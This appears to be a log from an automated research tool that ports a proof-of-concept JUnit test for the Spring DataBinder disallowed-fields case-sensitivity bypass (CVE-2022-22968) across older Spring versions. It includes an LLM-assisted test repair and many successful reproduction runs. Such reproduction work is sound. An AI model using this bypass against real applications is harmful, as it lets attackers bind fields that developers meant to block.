  location: variable pvs of type org.springframework.beans.MutablePropertyValues
[INFO] 2 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.906 s
[INFO] Finished at: 2025-07-11T03:20:18Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-22968: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,12] cannot find symbol
[ERROR]   symbol:   method add(java.lang.String,java.lang.String)
[ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,12] cannot find symbol
[ERROR]   symbol:   method add(java.lang.String,int)
[ERROR]   location: variable pvs of type org.springframework.beans.MutablePropertyValues
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>
  <groupId>edu.vision.se</groupId>
  <artifactId>CVE-2022-22968</artifactId>
  <version>1.0-SNAPSHOT</version>
  <properties>
    <maven.compiler.target>11</maven.compiler.target>
    <maven.compiler.source>11</maven.compiler.source>
  </properties>
  <dependencies>
    <dependency>
      <groupId>org.springframework</groupId>
      <artifactId>spring-context</artifactId>
      <version>2.5.6.SEC03</version>
    </dependency>
  <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
  
  </dependencies>
</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 154 (prompt), 12 (completion), 166 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 2.5.6.SEC03: 

Error: cannot find symbol, method add(java.lang.String,java.lang.String), variable pvs of type org.springframework.beans.MutablePropertyValues 

The test executes as expected in 3.0.0.RELEASE 

Error code:         pvs.add("name", "Rod"); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
`MutablePropertyValues.add`;`pvs.add`
[96m[ErrorManager] Extracted key entities: ['`MutablePropertyValues.add`', '`pvs.add`'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 19, 'column': 12, 'message': 'cannot find symbol', 'symbol': 'method add(java.lang.String,java.lang.String)', 'location': 'variable pvs of type org.springframework.beans.MutablePropertyValues', 'code_line': '        pvs.add("name", "Rod");'} with cause: ['`MutablePropertyValues.add`', '`pvs.add`'][0m
[96m[Adapter] Related diffs for error: [][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: cannot find symbol | method add(java.lang.String,java.lang.String) cause: ['`MutablePropertyValues.add`', '`pvs.add`'][0m
[96m[RepairModule] Trying best diff #None with score 0.00[0m
[93m[RepairModule] Diff #None content empty[0m
[LLMClient] Tokens used: 506 (prompt), 308 (completion), 814 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 2.5.6.SEC03:org.springframework:spring-context.
This test file compiles and runs successfully in 3.0.0.RELEASE.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.0.0.RELEASE to 2.5.6.SEC03.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: cannot find symbol, symble: method add(java.lang.String,java.lang.String), location: variable pvs of type org.springframework.beans.MutablePropertyValues

### Error Position:
        pvs.add("name", "Rod");

### Related Diff:


### Test File Content:
package edu.vision.se;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertTrue;

import org.junit.Test;
import org.springframework.beans.MutablePropertyValues;
import org.springframework.validation.BindException;
import org.springframework.validation.DataBinder;

public class Testcase1 {
    @Test
    public void bindingWithAllowedAndDisallowedFields() throws BindException {
        TestBean rod = new TestBean();
        DataBinder binder = new DataBinder(rod);
        binder.setAllowedFields(new String[] {"name", "age"});
        binder.setDisallowedFields(new String[] {"AGE"});
        MutablePropertyValues pvs = new MutablePropertyValues();
        pvs.add("name", "Rod");
        pvs.add("age", 32);

        binder.bind(pvs);
        binder.close();

        assertEquals("changed name correctly", "Rod", rod.getName());
        assertEquals("did not change age", 0, rod.getAge());

        String[] suppressedFields = binder.getBindingResult().getSuppressedFields();
        boolean containsField = false;
        for (String actualField : suppressedFields) {
            if ("age".equals(actualField)) {
                containsField = true;
                break;
            }
        }
        assertTrue("not found: " + "age", containsField);

    }
}



[LLMClient] Response: 
Here's the modified version of the test file according to the diff:

```java
package edu.vision.se;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertTrue;

import org.junit.Test;
import org.springframework.beans.MutablePropertyValues;
import org.springframework.beans.PropertyValue;
import org.springframework.validation.BindException;
import org.springframework.validation.DataBinder;

public class Testcase1 {
    @Test
    public void bindingWithAllowedAndDisallowedFields() throws BindException {
        TestBean rod = new TestBean();
        DataBinder binder = new DataBinder(rod);
        binder.setAllowedFields(new String[] {"name", "age"});
        binder.setDisallowedFields(new String[] {"AGE"});
        MutablePropertyValues pvs = new MutablePropertyValues();
        pvs.addPropertyValue(new PropertyValue("name", "Rod"));
        pvs.addPropertyValue(new PropertyValue("age", 32));

        binder.bind(pvs);
        binder.close();

        assertEquals("changed name correctly", "Rod", rod.getName());
        assertEquals("did not change age", 0, rod.getAge());

        String[] suppressedFields = binder.getBindingResult().getSuppressedFields();
        boolean containsField = false;
        for (String actualField : suppressedFields) {
            if ("age".equals(actualField)) {
                containsField = true;
                break;
            }
        }
        assertTrue("not found: " + "age", containsField);

    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2022-22968/2.5.6.SEC03/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.5.6.SEC03...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: '32'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[RepairModule] Repair success![0m
[92m[RepairModule] Repair success with best diff![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.5.6.SEC03...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: '32'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Adapter] Adaptation from 3.0.0.RELEASE to 2.5.6.SEC03 successful.[0m
[Adapt] âœ“ Completed: True
[96m[Adapter] Adaptation complete. Retesting exploit on 2.5.6.SEC03...[0m
[92m[Executor] Adaptation + reproduction successful on 2.5.6.SEC03[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2022-22968/2.5.6.SEC03[0m
[96m[Selector] Nearest need adapatation version selected: 2.5.6.SEC02[0m
[96m[Selector] Closest reproduced version: 2.5.6.SEC03 at index 45[0m
[96m[Adapter] Trying next closest version: 2.5.6.SEC02[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2022-22968/2.5.6.SEC03/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.6.SEC02/exploit[0m
[96m[Preparer] Updating dependency version to 2.5.6.SEC02 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.6.SEC02/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.5.6.SEC02 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.6.SEC02/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.5.6.SEC02...[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.5.6.SEC02...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: '32'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.5.6.SEC02[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2022-22968/2.5.6.SEC02[0m
[96m[Selector] Nearest need adapatation version selected: 2.5.6.SEC01[0m
[96m[Selector] Closest reproduced version: 2.5.6.SEC02 at index 44[0m
[96m[Adapter] Trying next closest version: 2.5.6.SEC01[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2022-22968/2.5.6.SEC02/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.6.SEC01/exploit[0m
[96m[Preparer] Updating dependency version to 2.5.6.SEC01 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.6.SEC01/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.5.6.SEC01 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.6.SEC01/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.5.6.SEC01...[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.5.6.SEC01...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: '32'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.5.6.SEC01[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2022-22968/2.5.6.SEC01[0m
[96m[Selector] Nearest need adapatation version selected: 2.5.6[0m
[96m[Selector] Closest reproduced version: 2.5.6.SEC01 at index 43[0m
[96m[Adapter] Trying next closest version: 2.5.6[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2022-22968/2.5.6.SEC01/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.6/exploit[0m
[96m[Preparer] Updating dependency version to 2.5.6 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.6/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.5.6 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.6/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.5.6...[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.5.6...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: '32'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.5.6[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2022-22968/2.5.6[0m
[96m[Selector] Nearest need adapatation version selected: 2.5.5[0m
[96m[Selector] Closest reproduced version: 2.5.6 at index 42[0m
[96m[Adapter] Trying next closest version: 2.5.5[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2022-22968/2.5.6/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.5/exploit[0m
[96m[Preparer] Updating dependency version to 2.5.5 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.5/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.5.5 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.5/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.5.5...[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.5.5...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: '32'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.5.5[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2022-22968/2.5.5[0m
[96m[Selector] Nearest need adapatation version selected: 2.5.4[0m
[96m[Selector] Closest reproduced version: 2.5.5 at index 41[0m
[96m[Adapter] Trying next closest version: 2.5.4[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2022-22968/2.5.5/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.4/exploit[0m
[96m[Preparer] Updating dependency version to 2.5.4 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.4/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.5.4 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.4/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.5.4...[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.5.4...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: '32'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.5.4[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2022-22968/2.5.4[0m
[96m[Selector] Nearest need adapatation version selected: 2.5.3[0m
[96m[Selector] Closest reproduced version: 2.5.4 at index 40[0m
[96m[Adapter] Trying next closest version: 2.5.3[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2022-22968/2.5.4/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.3/exploit[0m
[96m[Preparer] Updating dependency version to 2.5.3 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.3/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.5.3 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.3/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.5.3...[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.5.3...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: '32'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.5.3[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2022-22968/2.5.3[0m
[96m[Selector] Nearest need adapatation version selected: 2.5.2[0m
[96m[Selector] Closest reproduced version: 2.5.3 at index 39[0m
[96m[Adapter] Trying next closest version: 2.5.2[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2022-22968/2.5.3/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.2/exploit[0m
[96m[Preparer] Updating dependency version to 2.5.2 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.2/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.5.2 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.2/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.5.2...[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.5.2...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: '32'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.5.2[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2022-22968/2.5.2[0m
[96m[Selector] Nearest need adapatation version selected: 2.5.1[0m
[96m[Selector] Closest reproduced version: 2.5.2 at index 38[0m
[96m[Adapter] Trying next closest version: 2.5.1[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2022-22968/2.5.2/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.1/exploit[0m
[96m[Preparer] Updating dependency version to 2.5.1 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.1/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.5.1 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5.1/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.5.1...[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.5.1...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: '32'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.5.1[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2022-22968/2.5.1[0m
[96m[Selector] Nearest need adapatation version selected: 2.5[0m
[96m[Selector] Closest reproduced version: 2.5.1 at index 37[0m
[96m[Adapter] Trying next closest version: 2.5[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2022-22968/2.5.1/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5/exploit[0m
[96m[Preparer] Updating dependency version to 2.5 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.5 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.5/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.5...[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.5...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: '32'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.5[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2022-22968/2.5[0m
[96m[Selector] Nearest need adapatation version selected: 2.0.8[0m
[96m[Selector] Closest reproduced version: 2.5 at index 36[0m
[96m[Adapter] Trying next closest version: 2.0.8[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2022-22968/2.5/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.8/exploit[0m
[96m[Preparer] Updating dependency version to 2.0.8 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.8/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.0.8 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.8/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.0.8...[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.0.8...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: '32'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.0.8[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2022-22968/2.0.8[0m
[96m[Selector] Nearest need adapatation version selected: 2.0.7[0m
[96m[Selector] Closest reproduced version: 2.0.8 at index 35[0m
[96m[Adapter] Trying next closest version: 2.0.7[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2022-22968/2.0.8/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.7/exploit[0m
[96m[Preparer] Updating dependency version to 2.0.7 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.7/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.0.7 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.7/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.0.7...[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.0.7...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: '32'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.0.7[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2022-22968/2.0.7[0m
[96m[Selector] Nearest need adapatation version selected: 2.0.6[0m
[96m[Selector] Closest reproduced version: 2.0.7 at index 34[0m
[96m[Adapter] Trying next closest version: 2.0.6[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2022-22968/2.0.7/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.6/exploit[0m
[96m[Preparer] Updating dependency version to 2.0.6 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.6/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.0.6 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.6/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.0.6...[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.0.6...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: '32'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.0.6[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2022-22968/2.0.6[0m
[96m[Selector] Nearest need adapatation version selected: 2.0.5[0m
[96m[Selector] Closest reproduced version: 2.0.6 at index 33[0m
[96m[Adapter] Trying next closest version: 2.0.5[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2022-22968/2.0.6/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.5/exploit[0m
[96m[Preparer] Updating dependency version to 2.0.5 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.5/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.0.5 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.5/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.0.5...[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.0.5...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: '32'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.0.5[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2022-22968/2.0.5[0m
[96m[Selector] Nearest need adapatation version selected: 2.0.4[0m
[96m[Selector] Closest reproduced version: 2.0.5 at index 32[0m
[96m[Adapter] Trying next closest version: 2.0.4[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2022-22968/2.0.5/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.4/exploit[0m
[96m[Preparer] Updating dependency version to 2.0.4 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.4/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.0.4 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.4/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.0.4...[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.0.4...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: '32'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.0.4[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2022-22968/2.0.4[0m
[96m[Selector] Nearest need adapatation version selected: 2.0.3[0m
[96m[Selector] Closest reproduced version: 2.0.4 at index 31[0m
[96m[Adapter] Trying next closest version: 2.0.3[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2022-22968/2.0.4/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.3/exploit[0m
[96m[Preparer] Updating dependency version to 2.0.3 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.3/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.0.3 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.3/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.0.3...[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.0.3...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: '32'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.0.3[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2022-22968/2.0.3[0m
[96m[Selector] Nearest need adapatation version selected: 2.0.2[0m
[96m[Selector] Closest reproduced version: 2.0.3 at index 30[0m
[96m[Adapter] Trying next closest version: 2.0.2[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2022-22968/2.0.3/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.2/exploit[0m
[96m[Preparer] Updating dependency version to 2.0.2 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.2/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.0.2 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.2/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.0.2...[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.0.2...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: '32'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.0.2[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2022-22968/2.0.2[0m
[96m[Selector] Nearest need adapatation version selected: 2.0.1[0m
[96m[Selector] Closest reproduced version: 2.0.2 at index 29[0m
[96m[Adapter] Trying next closest version: 2.0.1[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2022-22968/2.0.2/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.1/exploit[0m
[96m[Preparer] Updating dependency version to 2.0.1 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.1/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.0.1 in /PoCAdaptation/exploit/pending/CVE-2022-22968/2.0.1/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.0.1...[0m
[96m[Executor] Executing exploit for CVE-2022-22968 on version 2.0.1...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: '32'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 2.0.1[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2022-22968/2.0.1[0m
[96m[Selector] Nearest need adapatation version selected: 2.0[0m
